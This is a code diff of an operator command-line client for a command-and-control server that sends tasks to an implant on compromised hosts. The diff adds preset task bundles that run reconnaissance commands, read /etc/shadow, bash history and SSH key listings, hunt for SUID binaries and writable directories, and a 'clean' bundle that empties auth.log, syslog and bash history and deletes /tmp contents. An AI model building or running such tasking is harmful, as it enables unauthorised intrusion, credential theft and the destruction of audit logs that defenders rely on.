@@ -1,25 +1,4 @@
 #!/usr/bin/env python3
-"""
-operator.py — Operator CLI for the C2 Listening Post
-------------------------------------------------------
-Talks to listening_post.py (Flask-RESTful + Supabase) over plain HTTP/JSON.
-
-Commands
-  list-tasks     GET  /tasks
-  list-results   GET  /results
-  list-history   GET  /history
-  add-task       POST /tasks   (requires --title and --tasktype; extra --params
-                                key=value pairs are forwarded as task parameters)
-
-Usage
-  python operator.py [--server URL] [--timeout N]
-
-  python operator.py add-task --title "Run whoami" --tasktype execute --params command=whoami
-  python operator.py add-task --title "Configure beacon" --tasktype configure --params dwell=10,running=true
-  python operator.py list-tasks
-  python operator.py list-results
-  python operator.py list-history
-"""
 
 import sys
 import json
@@ -28,18 +7,17 @@ import argparse
 import requests
 from requests.exceptions import ConnectionError, Timeout, HTTPError
 
-# ── optional pretty-printing ──────────────────────────────────────────────────
 try:
     from rich.console import Console
     from rich.syntax import Syntax
     from rich.panel import Panel
     from rich.table import Table
+    from rich import box
     _RICH = True
     console = Console()
 except ImportError:
     _RICH = False
 
-# ── optional REPL enhancements ────────────────────────────────────────────────
 try:
     from prompt_toolkit import PromptSession
     from prompt_toolkit.history import InMemoryHistory
@@ -50,11 +28,50 @@ except ImportError:
     _PT = False
 
 
-DEFAULT_SERVER = "http://127.0.0.1:5000"
+BUNDLES: dict[str, list[dict]] = {
+    "recon": [
+        {"title": "Who am I",          "task_type": "execute", "command": "whoami"},
+        {"title": "Hostname",           "task_type": "execute", "command": "hostname"},
+        {"title": "Network config",     "task_type": "execute", "command": "ip a"},
+        {"title": "Running processes",  "task_type": "execute", "command": "ps aux"},
+        {"title": "System info",        "task_type": "execute", "command": "uname -a"},
+        {"title": "OS release",         "task_type": "execute", "command": "cat /etc/os-release"},
+        {"title": "Local users",        "task_type": "execute", "command": "cat /etc/passwd"},
+        {"title": "Logged in users",    "task_type": "execute", "command": "who"},
+        {"title": "Active connections", "task_type": "execute", "command": "ss -tulnp"},
+    ],
+    "fs": [
+        {"title": "List root",          "task_type": "execute", "command": "ls -la /"},
+        {"title": "List home",          "task_type": "execute", "command": "ls -la ~"},
+        {"title": "Find SUID binaries", "task_type": "execute", "command": "find / -perm -4000 -type f 2>/dev/null"},
+        {"title": "Find writable dirs", "task_type": "execute", "command": "find / -writable -type d 2>/dev/null"},
+        {"title": "Find txt files",     "task_type": "execute", "command": "find /home -name '*.txt' 2>/dev/null"},
+    ],
+    "cred": [
+        {"title": "Environment vars",   "task_type": "execute", "command": "env"},
+        {"title": "Bash history",       "task_type": "execute", "command": "cat ~/.bash_history"},
+        {"title": "SSH keys",           "task_type": "execute", "command": "ls -la ~/.ssh/"},
+        {"title": "Sudo rights",        "task_type": "execute", "command": "sudo -l"},
+        {"title": "Shadow file",        "task_type": "execute", "command": "cat /etc/shadow"},
+    ],
+    "net": [
+        {"title": "ARP table",          "task_type": "execute", "command": "arp -a"},
+        {"title": "Route table",        "task_type": "execute", "command": "ip route"},
+        {"title": "DNS config",         "task_type": "execute", "command": "cat /etc/resolv.conf"},
+        {"title": "Hosts file",         "task_type": "execute", "command": "cat /etc/hosts"},
+        {"title": "Firewall rules",     "task_type": "execute", "command": "iptables -L -n -v"},
+    ],
+    "clean": [
+        {"title": "Clear bash history", "task_type": "execute", "command": "cat /dev/null > ~/.bash_history"},
+        {"title": "Clear auth log",     "task_type": "execute", "command": "cat /dev/null > /var/log/auth.log"},
+        {"title": "Clear syslog",       "task_type": "execute", "command": "cat /dev/null > /var/log/syslog"},
+        {"title": "Clear tmp",          "task_type": "execute", "command": "rm -rf /tmp/*"},
+    ],
+    "ping": [
+        {"title": "Ping implant", "task_type": "ping"},
+    ],
+}
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  Output helpers
-# ─────────────────────────────────────────────────────────────────────────────
 
 def ok(msg):
     if _RICH: console.print(f"[bold green][+][/bold green] {msg}")
@@ -81,9 +98,28 @@ def pretty(data, title=""):
             border_style="cyan",
         ))
     else:
-        if title:
-            print(f"\n── {title} ──")
+        if title: print(f"\n── {title} ──")
         print(text)
+
+def print_bundles():
+    if _RICH:
+        t = Table(title="Available Task Bundles", box=box.ROUNDED,
+                  border_style="cyan", header_style="bold magenta")
+        t.add_column("Bundle", style="bold yellow", no_wrap=True)
+        t.add_column("Tasks", justify="right", style="cyan")
+        t.add_column("Task titles", style="white")
+        for name, tasks in BUNDLES.items():
+            titles = ", ".join(t_["title"] for t_ in tasks)
+            t.add_row(name, str(len(tasks)), titles)
+        console.print(t)
+    else:
+        print("\nAvailable bundles:")
+        for name, tasks in BUNDLES.items():
+            print(f"  {name}  ({len(tasks)} tasks)")
+            for task in tasks:
+                print(f"    · {task['title']}  [{task['task_type']}]")
+        print()
+
 
 BANNER = r"""
   ██████╗██████╗      ██████╗██╗     ██╗
@@ -95,135 +131,62 @@ BANNER = r"""
    Operator CLI  ·  Listening Post Edition
 """
 
-HELP_TEXT = """
-  list-tasks                              List all tasks in the DB
-  list-results                            List all results returned by the implant
-  list-history                            List the full task + result history
-  add-task --title T --tasktype TYPE      Queue a new task
-           [--desc D]                       Optional description
-           [--params key=val,key=val]        Extra task parameters (e.g. command=whoami)
-  help                                    Show this message
-  exit / quit                             Exit the CLI
+HELP_TEXT = f"""
+  list-tasks              List all tasks in the database
+  list-results            List all results returned by the implant
+  list-history            List the full task + result history
+  addtask <bundle>        Queue every task in a bundle
+  bundles                 Show all available bundles
+  help                    Show this message
+  exit / quit             Exit the CLI
+
+Available bundles: {", ".join(BUNDLES.keys())}
 """
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  HTTP helpers
-# ─────────────────────────────────────────────────────────────────────────────
 
 class LPClient:
-    """Thin wrapper around requests for the listening post REST API."""
-
-    def __init__(self, base_url: str, timeout: int = 10):
-        self.base_url = base_url.rstrip("/")
-        self.timeout  = timeout
-        self._s       = requests.Session()
+    def __init__(self, host: str, port: int, timeout: int = 10):
+        if host.startswith("http://") or host.startswith("https://"):
+            self.base_url = f"{host.rstrip('/')}:{port}"
+        else:
+            self.base_url = f"http://{host}:{port}"
+        self.timeout = timeout
+        self._s = requests.Session()
         self._s.headers.update({"Content-Type": "application/json"})
 
-    # ── low-level ─────────────────────────────────────────────────────────────
-
     def _get(self, endpoint: str):
-        resp = self._s.get(f"{self.base_url}{endpoint}", timeout=self.timeout)
-        resp.raise_for_status()
-        return resp.json()
+        r = self._s.get(f"{self.base_url}{endpoint}", timeout=self.timeout)
+        r.raise_for_status()
+        return r.json()
 
     def _post(self, endpoint: str, payload):
-        resp = self._s.post(f"{self.base_url}{endpoint}",
-                            json=payload, timeout=self.timeout)
-        resp.raise_for_status()
-        return resp.json()
+        r = self._s.post(f"{self.base_url}{endpoint}", json=payload, timeout=self.timeout)
+        r.raise_for_status()
+        return r.json()
 
-    # ── public API methods ────────────────────────────────────────────────────
+    def list_tasks(self):   return self._get("/tasks")
+    def list_results(self): return self._get("/results")
+    def list_history(self): return self._get("/history")
 
-    def list_tasks(self):
-        return self._get("/tasks")
-
-    def list_results(self):
-        return self._get("/results")
-
-    def list_history(self):
-        return self._get("/history")
-
-    def add_task(self, title: str, task_type: str,
-                 description: str = None, params: dict = None):
-        """
-        Build and POST a task payload that matches Tasks.post() in resources.py.
-
-        Standard fields (title, description, task_type, status) are sent at the
-        top level. Any extra key/value pairs in `params` are also sent at the top
-        level — resources.py separates them into the `parameters` jsonb column
-        automatically.
-        """
-        payload = {
-            "title":     title,
-            "task_type": task_type,
-            "status":    "pending",
-        }
-        if description:
-            payload["description"] = description
-        if params:
-            payload.update(params)   # e.g. command="whoami" or dwell=10
-
-        # The API accepts a single object or a list; we send a single object
-        return self._post("/tasks", payload)
+    def submit_bundle(self, bundle_name: str) -> list:
+        tasks = BUNDLES[bundle_name]
+        responses = []
+        for task in tasks:
+            resp = self._post("/tasks", task)
+            responses.append((task, resp))
+        return responses
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  Argument parsing for the add-task inline command
-# ─────────────────────────────────────────────────────────────────────────────
-
-def parse_params(params_str: str) -> dict:
-    """
-    'command=whoami,timeout=5'  →  {'command': 'whoami', 'timeout': '5'}
-    Handles values that contain spaces if quoted: command="ping google.com"
-    """
-    result = {}
-    # Split on commas that are NOT inside quotes
-    import re
-    pairs = re.split(r',(?=(?:[^"]*"[^"]*")*[^"]*$)', params_str)
-    for pair in pairs:
-        if "=" not in pair:
-            raise ValueError(f"'{pair}' is not key=value format")
-        key, _, value = pair.partition("=")
-        result[key.strip()] = value.strip().strip('"')
-    return result
-
-
-def parse_add_task_args(args: list[str]) -> dict:
-    """Parse inline 'add-task --title T --tasktype X ...' arguments."""
-    p = argparse.ArgumentParser(prog="add-task", add_help=False)
-    p.add_argument("--title",    required=True)
-    p.add_argument("--tasktype", required=True)
-    p.add_argument("--desc",     default=None)
-    p.add_argument("--params",   default=None,
-                   help="Comma-separated key=value pairs")
-    ns, unknown = p.parse_known_args(args)
-    if unknown:
-        raise ValueError(f"Unknown arguments: {unknown}")
-
-    params = parse_params(ns.params) if ns.params else None
-    return {
-        "title":       ns.title,
-        "task_type":   ns.tasktype,
-        "description": ns.desc,
-        "params":      params,
-    }
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-#  REPL
-# ─────────────────────────────────────────────────────────────────────────────
-
-REPL_COMMANDS = [
-    "list-tasks", "list-results", "list-history",
-    "add-task", "help", "exit", "quit",
-]
+REPL_COMMANDS = ["list-tasks", "list-results", "list-history",
+                 "addtask", "bundles", "help", "exit", "quit",
+                 *BUNDLES.keys()]
 
 def run_repl(client: LPClient):
     if _RICH: console.print(BANNER, style="bold cyan")
     else: print(BANNER)
 
-    info(f"Connected to listening post at {client.base_url}")
-    info("Type 'help' for available commands\n")
+    info(f"Listening post → {client.base_url}")
+    info("Type 'help' for commands, 'bundles' to see available task bundles\n")
 
     if _PT:
         session = PromptSession(
@@ -248,7 +211,6 @@ def run_repl(client: LPClient):
         cmd   = parts[0].lower()
         args  = parts[1:]
 
-        # ── dispatch ──────────────────────────────────────────────────────────
         try:
             if cmd in ("exit", "quit"):
                 break
@@ -256,49 +218,56 @@ def run_repl(client: LPClient):
             elif cmd == "help":
                 print(HELP_TEXT)
 
+            elif cmd == "bundles":
+                print_bundles()
+
             elif cmd == "list-tasks":
                 data = client.list_tasks()
-                if not data:
-                    warn("No tasks found.")
+                if not data: warn("No tasks found.")
                 else:
-                    ok(f"{len(data)} task(s) found")
-                    pretty(data, title="Tasks")
+                    ok(f"{len(data)} task(s)")
+                    pretty(data, "Tasks")
 
             elif cmd == "list-results":
                 data = client.list_results()
-                if not data:
-                    warn("No results yet.")
+                if not data: warn("No results yet.")
                 else:
-                    ok(f"{len(data)} result(s) found")
-                    pretty(data, title="Results")
+                    ok(f"{len(data)} result(s)")
+                    pretty(data, "Results")
 
             elif cmd == "list-history":
                 data = client.list_history()
-                if not data:
-                    warn("History is empty.")
+                if not data: warn("History is empty.")
                 else:
-                    ok(f"{len(data)} history record(s) found")
-                    pretty(data, title="History")
+                    ok(f"{len(data)} record(s)")
+                    pretty(data, "History")
 
-            elif cmd == "add-task":
+            elif cmd == "addtask":
                 if not args:
-                    err("Usage: add-task --title T --tasktype TYPE [--desc D] [--params k=v,k=v]")
-                    continue
-                try:
-                    kwargs = parse_add_task_args(args)
-                except (ValueError, SystemExit) as exc:
-                    err(f"Bad arguments: {exc}")
+                    err("Usage: addtask <bundle>")
+                    info(f"Available bundles: {', '.join(BUNDLES.keys())}")
                     continue
 
-                data = client.add_task(**kwargs)
-                ok("Task created:")
-                pretty(data, title="New Task")
+                bundle_name = args[0].lower()
+                if bundle_name not in BUNDLES:
+                    err(f"Unknown bundle '{bundle_name}'")
+                    info(f"Available: {', '.join(BUNDLES.keys())}")
+                    continue
+
+                bundle_tasks = BUNDLES[bundle_name]
+                info(f"Queuing {len(bundle_tasks)} task(s) from {bundle_name} ...")
+
+                results = client.submit_bundle(bundle_name)
+                for task, resp in results:
+                    ok(f"  ✓ {task['title']}")
+
+                ok(f"Bundle '{bundle_name}' queued — {len(results)} task(s) submitted.")
 
             else:
                 err(f"Unknown command '{cmd}'. Type 'help'.")
 
         except (ConnectionError, Timeout):
-            err(f"Lost connection to {client.base_url}. Is the listening post running?")
+            err(f"Lost connection to {client.base_url}")
         except HTTPError as exc:
             err(f"HTTP {exc.response.status_code}: {exc.response.text}")
         except Exception as exc:
@@ -306,23 +275,24 @@ def run_repl(client: LPClient):
 
     info("Goodbye.")
 
+
 def main():
-    p = argparse.ArgumentParser(description="Operator CLI — Listening Post Edition")
-    p.add_argument("--server",  "-s", default=DEFAULT_SERVER,
-                   help=f"Listening post URL (default: {DEFAULT_SERVER})")
-    p.add_argument("--timeout", "-t", type=int, default=10,
-                   help="Request timeout in seconds (default: 10)")
+    p = argparse.ArgumentParser(description="Operator CLI")
+    p.add_argument("host")
+    p.add_argument("port", nargs="?", type=int, default=5000)
+    p.add_argument("--timeout", type=int, default=10)
     a = p.parse_args()
 
-    client = LPClient(a.server, timeout=a.timeout)
+    client = LPClient(a.host, a.port, timeout=a.timeout)
 
+    info(f"Connecting to {client.base_url} ...")
     try:
-        client.list_tasks()   
+        client.list_tasks()
     except (ConnectionError, Timeout):
-        err(f"Cannot reach listening post at {a.server}. Is it running?")
+        err(f"Cannot reach {client.base_url} — is the listening post running?")
         sys.exit(1)
     except HTTPError as exc:
-        err(f"Listening post returned HTTP {exc.response.status_code}. Check your server.")
+        err(f"HTTP {exc.response.status_code} from {client.base_url}")
         sys.exit(1)
 
     run_repl(client)
